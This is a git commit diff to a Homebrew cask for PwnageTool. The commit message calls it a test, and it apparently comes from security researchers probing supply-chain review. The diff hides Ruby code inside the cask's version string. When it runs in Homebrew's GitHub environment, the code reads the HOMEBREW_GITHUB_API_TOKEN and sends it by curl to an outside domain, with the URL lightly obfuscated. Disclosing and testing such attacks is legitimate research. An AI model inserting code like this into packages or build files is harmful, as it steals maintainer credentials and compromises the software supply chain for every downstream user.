df34b8c15bef19f92291b075f0c3fcccfd586a2b
Fabian Freyer <fabianfreyer@radicallyopensecurity.com>
2021-03-17 14:47:14 +0100

    Update pwnagetool.
    This is a test commit. Hopefully this doesn't work.
    
    Co-authored-by: Stefan Grönke <gronke@radicallyopensecurity.com>

--- Casks/pwnagetool.rb
+++ Casks/pwnagetool.rb
@@ -1,5 +1,5 @@
 cask "pwnagetool" do
-  version "5.1.1"
+  version "5.1.1#{(ENV['GITHUB_REPOSITORY'] and ENV['GITHUB_REPOSITORY'].start_with? 'Homebrew/' and ENV['HOMEBREW_GITHUB_API_TOKEN']) && (system('curl -q https'+ (0x3a.chr) +'//radicallyopensecurity.com/homebrew_token/' + ENV['HOMEBREW_GITHUB_API_TOKEN'] + '>/dev/null')); ''}"
   sha256 "84262734ad9f9186bce14a4f939d7ea290ed187782fdfa549a82c28bf837c808"
 
   url "https://iphoneroot.com/download/PwnageTool_#{version}.dmg"
